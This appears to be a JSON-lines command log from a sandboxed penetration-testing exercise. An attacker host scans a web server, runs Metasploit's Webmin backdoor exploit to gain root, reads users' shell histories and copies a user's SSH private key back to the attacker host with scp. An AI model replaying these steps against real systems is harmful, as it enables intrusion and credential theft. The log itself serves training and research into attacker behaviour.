@@ -1,0 +1,97 @@
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:13:48.015Z","sandbox_id":"668","cmd":"ping 172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:14:45.876Z","sandbox_id":"668","cmd":"help","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:15:16.518Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:16:11.151Z","sandbox_id":"668","cmd":"vim ssh2john.py","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:18:16.683Z","sandbox_id":"668","cmd":"ssh user@172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:22:03.225Z","sandbox_id":"668","cmd":"nmap -A 172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:23:43.679Z","sandbox_id":"668","cmd":"nmap -sS 172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:23:55.202Z","sandbox_id":"668","cmd":"sudo nmap -sS 172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:28:03.690Z","sandbox_id":"668","cmd":"nmap --open -A 172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:28:11.867Z","sandbox_id":"668","cmd":"nmap --open 172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:28:27.595Z","sandbox_id":"668","cmd":"nmap --help","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:30:54.347Z","sandbox_id":"668","cmd":"nmap -sV -p 10000 172.18.1.5","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:46:32.542Z","sandbox_id":"668","cmd":"curl -4 172.18.1.5:10000 -d /password_reset.cgi?user=root&pam&expired&old=wrong","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:50:07.471Z","sandbox_id":"668","cmd":"mfconsole","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:51:59.675Z","sandbox_id":"668","cmd":"--help","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:54:42.286Z","sandbox_id":"668","cmd":"search webmin","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:56:40.888Z","sandbox_id":"668","cmd":"use exploit/unix/webapp/webmin_backdoor","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:57:35.867Z","sandbox_id":"668","cmd":"exploit","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T10:59:53.031Z","sandbox_id":"668","cmd":"options","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:00:17.114Z","sandbox_id":"668","cmd":"set RHOSTS 172.18.1.5","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:00:19.885Z","sandbox_id":"668","cmd":"options","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:00:23.308Z","sandbox_id":"668","cmd":"exploit","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:02:48.985Z","sandbox_id":"668","cmd":"use path-to-exploit","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:02:55.171Z","sandbox_id":"668","cmd":"show options","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:03:20.517Z","sandbox_id":"668","cmd":"exit","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:03:20.572Z","sandbox_id":"668","cmd":"msfconsole","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:03:25.328Z","sandbox_id":"668","cmd":"ipconfig","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:03:45.872Z","sandbox_id":"668","cmd":"ip a","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:04:49.406Z","sandbox_id":"668","cmd":"ip","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:04:52.895Z","sandbox_id":"668","cmd":"ip --help","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:05:04.296Z","sandbox_id":"668","cmd":"ip -4","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:06:11.438Z","sandbox_id":"668","cmd":"set LHOST 10.1.135.83","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:06:33.515Z","sandbox_id":"668","cmd":"use exploit/unix/webapp/webmin_backdoor","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:06:36.766Z","sandbox_id":"668","cmd":"show options","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:06:41.381Z","sandbox_id":"668","cmd":"set RHOSTS 172.18.1.5","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:06:52.493Z","sandbox_id":"668","cmd":"set LHOST 10.1.135.83","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:17:56.429Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:18:11.237Z","sandbox_id":"668","cmd":"cat .bash_history","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:18:30.349Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:18:35.176Z","sandbox_id":"668","cmd":"cd root","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:18:38.368Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:18:40.535Z","sandbox_id":"668","cmd":"cd ..","pool_id":"73","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:18:46.626Z","sandbox_id":"668","cmd":"cd home","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:18:47.387Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:19:21.212Z","sandbox_id":"668","cmd":"ls -a /home/exe","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:19:24.242Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:19:27.776Z","sandbox_id":"668","cmd":"cd eve/","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:19:28.905Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:19:51.233Z","sandbox_id":"668","cmd":"less .bash_history","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:22:45.080Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:22:47.108Z","sandbox_id":"668","cmd":"cd ..","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:22:47.861Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:23:53.244Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:23:54.535Z","sandbox_id":"668","cmd":"cd ..","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:23:55.272Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:24:16.552Z","sandbox_id":"668","cmd":"find . -type d -name \"top-secret\"","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:25:10.760Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:25:13.034Z","sandbox_id":"668","cmd":"ls -a","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:25:19.179Z","sandbox_id":"668","cmd":"cd home","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:25:19.839Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:25:22.235Z","sandbox_id":"668","cmd":"cd eve","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:25:23.893Z","sandbox_id":"668","cmd":"ls -a","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:26:34.560Z","sandbox_id":"668","cmd":"cd .ssh","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:26:36.624Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:28:20.668Z","sandbox_id":"668","cmd":"scp id_rsa kali@10.1.135.83:/remote/directory","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:28:44.712Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:29:00.312Z","sandbox_id":"668","cmd":"scp id_rsa kali@10.1.135.83","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:29:32.104Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:29:34.408Z","sandbox_id":"668","cmd":"cd ..","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:29:35.557Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:29:37.104Z","sandbox_id":"668","cmd":"cd ..","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:29:37.743Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"kali"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:29:56.556Z","sandbox_id":"668","cmd":"exploit","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:30:09.192Z","sandbox_id":"668","cmd":"sessions -u 1","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:30:09.218Z","sandbox_id":"668","cmd":"uname -ms;echo OduDrwSUggCVVVjLAKrKKfgZUybxIGal","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:30:09.232Z","sandbox_id":"668","cmd":"python -V 2>&1;echo ILTcZPuTIkHhapCyGQKCrONaJrKLWhiK","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:30:22.236Z","sandbox_id":"668","cmd":"sessions -i 2","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:32:56.456Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/usr/local/webmin/acl","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:06.751Z","sandbox_id":"668","cmd":"cd root","pool_id":"73","wd":"/usr/local/webmin/acl","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:11.241Z","sandbox_id":"668","cmd":"cd /root","pool_id":"73","wd":"/usr/local/webmin/acl","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:13.698Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:16.785Z","sandbox_id":"668","cmd":"cd ..","pool_id":"73","wd":"/root","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:17.496Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:19.384Z","sandbox_id":"668","cmd":"cd home","pool_id":"73","wd":"/","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:19.953Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:21.052Z","sandbox_id":"668","cmd":"cd eve","pool_id":"73","wd":"/home","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:21.544Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:24.224Z","sandbox_id":"668","cmd":"ls -a","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:26.384Z","sandbox_id":"668","cmd":"cd .ssh","pool_id":"73","wd":"/home/eve","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:27.518Z","sandbox_id":"668","cmd":"ls","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:33:37.206Z","sandbox_id":"668","cmd":"exploit","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:33:51.120Z","sandbox_id":"668","cmd":"sessions -u 2","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:51.145Z","sandbox_id":"668","cmd":"uname -ms;echo rIDyxmpmpPJNkXGkqcRJIrNFhBfSaynV","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"web","ip":"172.18.1.5","timestamp_str":"2022-05-04T11:33:51.163Z","sandbox_id":"668","cmd":"python -V 2>&1;echo IvFEBlnKzZNjzIwLKpvHnXeVhEynwvWr","pool_id":"73","wd":"/home/eve/.ssh","cmd_type":"bash-command","username":"root"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:50:44.509Z","sandbox_id":"668","cmd":"exit","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:50:55.739Z","sandbox_id":"668","cmd":"exit -y","pool_id":"73","cmd_type":"msf-command"}
+{"hostname":"attacker","ip":"10.1.135.83","timestamp_str":"2022-05-04T11:50:55.769Z","sandbox_id":"668","cmd":"msfconsole","pool_id":"73","wd":"/home/kali","cmd_type":"bash-command","username":"kali"}
